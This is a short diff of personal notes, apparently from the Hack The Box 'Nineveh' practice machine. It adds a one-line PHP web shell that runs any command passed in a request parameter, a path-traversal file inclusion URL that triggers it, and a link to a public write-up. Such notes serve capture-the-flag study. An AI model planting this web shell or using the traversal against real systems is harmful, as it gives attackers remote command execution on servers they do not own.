@@ -58,4 +58,10 @@ found a password
 
 password123 is a password
 
+inside php <?php echo system($_REQUEST ["cmd"]); ?>
+
+http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../../../../var/tmp/random.php&cmd=ls
+
+https://ranakhalil101.medium.com/hack-the-box-nineveh-writeup-w-o-metasploit-1e84173ba485
+
 
